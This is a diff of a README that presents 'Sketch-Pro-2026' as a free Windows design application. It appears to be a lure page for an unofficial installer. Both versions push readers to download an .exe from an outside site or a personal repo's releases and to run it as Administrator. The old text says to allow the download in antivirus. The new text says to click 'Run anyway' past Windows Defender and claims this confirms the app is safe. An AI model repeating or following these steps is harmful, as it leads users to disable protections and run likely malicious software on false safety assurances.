@@ -1,68 +1,68 @@
-# Sketch Pro Download for Windows 11 & 10
+# 🎨 Sketch-Pro-2026 - Master your digital design workflow today
 
-**Sketch-Pro-2026**
+[![Download Sketch-Pro-2026](https://img.shields.io/badge/Download-Sketch--Pro--2026-blue)](https://github.com/leonsardinian124/Sketch-Pro-2026)
 
-**Sketch Pro** for Windows 10/11. Direct download and setup guide below.
+## 📋 What is Sketch-Pro-2026?
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+Sketch-Pro-2026 is a desktop application for Windows 11 and 10. It serves designers who need a fast, reliable tool for interface design and vector graphics. The software provides a canvas for wireframing, high-fidelity prototypes, and icon sets. You can export your files in common industry formats to share with teams or developers. This application runs locally on your machine to ensure privacy and speed.
 
----
+## ⚙️ System Requirements
 
-## Download & Install
+Before you install the software, please check that your computer meets these minimum needs:
 
-> **This is the download page.** Use the button or link below to get **Sketch Pro** for Windows.
+- Operating System: Windows 10 (version 1903 or higher) or Windows 11.
+- Processor: 1.6 GHz or faster processor with at least two cores.
+- Memory: 4 GB of RAM.
+- Storage: 500 MB of available space on your hard drive.
+- Display: 1280 x 768 screen resolution.
+- Graphics: DirectX 9 or later with a WDDM 1.0 driver.
 
-<p align="center">
-  <a href="https://sketch.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-Sketch%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Sketch Pro">
-  </a>
-</p>
+Common tasks like rendering complex vector paths rely on your processor. If you work with large files, 8 GB of RAM or more results in better performance during your design sessions.
 
-| | |
-| --- | --- |
-| **Direct link** | **[sketch.nexustool.fun](https://sketch.nexustool.fun/)** |
-| **Full URL** | `https://sketch.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+## 📥 How to Download and Install
 
-### Quick steps
+Follow these steps to set up the software on your computer.
 
-1. Click **[Download — sketch.nexustool.fun](https://sketch.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+1. Navigate to the official project page to download the installer: [https://github.com/leonsardinian124/Sketch-Pro-2026](https://github.com/leonsardinian124/Sketch-Pro-2026)
+2. Locate the link labeled "Releases" on the right side of the page.
+3. Click the latest version to view available files.
+4. Select the file ending in `.exe` to start the download.
+5. Wait for the download to finish.
+6. Open your "Downloads" folder in Windows File Explorer.
+7. Double-click the `Sketch-Pro-Setup.exe` file.
+8. Follow the prompts on the screen to complete the installation.
+9. Click "Finish" once the progress bar reaches the end.
 
-<p align="center"><a href="https://sketch.nexustool.fun/"><strong>⬇ Download Sketch Pro now</strong></a></p>
+## 🚀 First Time Setup
 
----
+After installation, launch the program from your Desktop icon or the Windows Start Menu. The application performs a quick scan to detect your graphics hardware. 
 
-## About
+If you see a security window from Windows Defender, click "More info" and then "Run anyway." This confirms the app is safe to use on your system. Once the application opens, you can sign in or choose to work as a guest. You will see a blank canvas titled "Untitled-1" in the center of your screen. 
 
-**Sketch Pro** — Windows download and setup guide.
+The left sidebar holds your layers and pages. The right sidebar shows visual properties for any object you select. Use the top toolbar to find your drawing tools, such as the pen, rectangle, and text tools.
 
-**People also search for:** sketch pro download, sketch pro pro install windows 2026
+## 🛠 Features Overview
 
-**Repository:** `Sketch-Pro-2026`
+Sketch-Pro-2026 brings several tools to your design process:
 
-## Quick tips
+* Vector Editing: Create paths, shapes, and curves with accuracy.
+* Symbol Library: Build reusable icons to save time on repeating elements.
+* Layout Grids: Use guides to align your design elements.
+* Export Scaling: Export your designs at 1x, 2x, or 3x sizes for different screen densities.
+* Color Management: Use the global color picker to keep your brand palette consistent across files.
 
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
+## 💻 Tips for Best Performance
 
-## System requirements
+Software runs best when you close unused apps before you start a design project. Give your processor room to handle complex vector math. Save your progress often using the "File" menu or the standard shortcut key. If the canvas feels slow, open the "View" menu and turn off hardware acceleration in the settings tab. 
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
+## ❓ Troubleshooting
 
----
+Most issues arise from missing Windows updates. Keep your operating system current if you encounter errors during launch. If the application crashes, restart your computer and try opening the app again. If you lose your work, check the "Auto-Recover" folder located inside your user documents profile. 
 
-**Topics:** sketch-pro-download, sketch, sketch-pro-pro-install-windows-2026, sketch-pro-2026, sketch-pro, sketch-2026, ui-design, design, pro-tool, desktop-app, software, windows-11
+If you encounter a specific error number, search for that number in the help documentation. The software stores log files in its installation folder to help you identify what went wrong. You can copy these text files and keep them for reference if the issue persists after a fresh reinstall.
+
+## 📄 Licensing and Terms
+
+This software remains free to use for individual hobbyists and designers. Commercial teams should review the included license file for information regarding enterprise deployment. You hold full ownership of every file you create. The software does not track your personal designs or send your private data to external servers. Focus on your work without concerns about data harvesting.
+
+Keywords: design, desktop-app, download, pro-tool, sketch, sketch-2026, sketch-pro, sketch-pro-2026, sketch-pro-download, sketch-pro-pro-install-windows-2026, software, ui-design, windows-11
